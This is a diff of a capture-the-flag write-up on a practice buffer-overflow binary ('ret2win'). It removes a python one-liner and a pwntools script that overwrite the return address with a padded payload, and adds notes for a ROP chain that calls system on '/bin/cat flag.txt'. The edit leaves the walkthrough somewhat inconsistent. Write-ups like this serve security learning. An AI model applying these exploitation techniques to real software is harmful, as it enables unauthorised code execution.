@@ -97,50 +97,18 @@ The program has crashed and we have overwritten the rsp,to find the extact offse
 
 ![source-01](/img/Screenshot_2020-05-09_11-23-21.png){: .align-left}
 
-
-## Exploiting:
-
-We have 40 bytes to fill the stack and then we need to put the address of the ret2win function.So that the saved return address will contain the address of the ret2win function (0x400811), and the program  execute the function.
-
-The exploit then will look as follows:
-
-**Payload: 
-
-The payload will be very simple, just our junk and return address, when writting return address keep an eye for endianess.
-
-[40 chars of junk] + [address of ret2win]  "A"*40             + "\x11\x08\x40"
-
-**Here is my final exploit:
-
-> python -c 'print "\x90"*40 + "\x11\x08\x40\x00\x00\x00\x00\x00"' | ./ret2win
+#### Building ROP-Chain
+Now we know what we need to build our ROP syscall: 
+(1) A string containing “/bin/cat flag.txt”, 
+(2) the address of system and 
+(3) a gadget to add “/bin/cat flag.txt” to rdi register, pop rdi; ret, is what we want.
 
 
-![source-01](/img/Screenshot_2020-05-09_15-53-55.png){: .align-left}
+POP- RDI
 
 
+![source-01](/img/Screenshot_2020-05-14_08-23-29.png	){: .align-left}
 
-Putting it all together,and i developed the final exploit with pwntools (python library) just for fun and learning.
-
-```python
-
-#!/usr/bin/python                                                              
- from pwn import *                                                              
- def main():                                                                    
-     context.log_level = "info"                                                 
-     elf = ELF('./ret2win')                                                     
-     info(elf.symbols.ret2win)                                                  
-     p = process(elf.path)                                                      
-     ret2win = p64(elf.symbols.ret2win)                                         
-     payload = b"A"*40 + ret2win                                                
-     p.sendline(payload)                                                        
-     p.recvuntil("Here's your flag:")                                           
-     flag = p.recvline()                                                        
-     success(flag)                                                              
- if __name__== "__main__":                                                      
-     main()    
-```
-
-![source-01](/img/Screenshot_2020-05-09_16-20-05.png){: .align-left}
 
 
 w00t we got the flag!
